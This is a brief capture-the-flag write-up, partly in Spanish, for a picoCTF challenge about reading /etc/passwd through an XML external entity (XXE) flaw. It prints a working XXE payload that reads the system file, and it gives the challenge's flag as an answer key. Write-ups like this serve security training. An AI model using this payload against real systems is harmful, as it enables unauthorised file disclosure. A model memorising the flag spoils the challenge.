
### Descripcion

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

### Solucion

```

Se utlizo la lectura de archivos con la vulnerabilidad de XXE en el cual leemos la direccion que nos dieron anteriormente

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
<ID>
&xxe;
</ID>
</data> 

picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}

```

### Notas



## Referencias